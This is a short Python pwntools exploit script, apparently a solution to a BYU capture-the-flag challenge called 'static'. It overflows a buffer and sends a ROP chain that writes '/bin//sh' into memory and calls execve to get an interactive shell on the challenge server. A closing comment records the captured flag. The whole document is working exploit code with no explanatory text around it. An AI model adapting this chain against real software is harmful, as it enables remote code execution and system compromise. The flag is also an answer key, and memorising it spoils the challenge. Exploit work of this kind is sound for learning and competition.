from pwn import *
from struct import pack

# io = process("./static")
io = remote("static.chal.cyberjousting.com", 1350)
context.arch = 'amd64'

payload = 0x12 * b'a'
payload += flat([
    0x00000000004062d8, # pop rsi ; ret
    0x000000000049d0c0, # @ .data
    0x000000000041069c, # pop rax ; ret
    '/bin//sh',
    0x00000000004116c1, # mov qword ptr [rsi], rax ; ret
    0x00000000004062d8, # pop rsi ; ret
    0x000000000049d0c8, # @ .data + 8
    0x000000000041e2e0, # xor rax, rax ; ret
    0x00000000004116c1, # mov qword ptr [rsi], rax ; ret
    0x0000000000401fe0, # pop rdi ; ret
    0x000000000049d0c0, # @ .data
    0x00000000004062d8, # pop rsi ; ret
    0x000000000049d0c8, # @ .data + 8
    0x000000000045e467, # pop rdx ; pop rbx ; ret
    0x000000000049d0c8, # @ .data + 8
    0x4141414141414141, # padding
    0x000000000041e2e0, # xor rax, rax ; ret
    0x41069c, # pop rax; ret
    59,
    0x0000000000401194
])

io.sendline(payload)
io.interactive() #byuctf{glaD_you_c0uld_improvise_ROP_with_no_provided_gadgets!}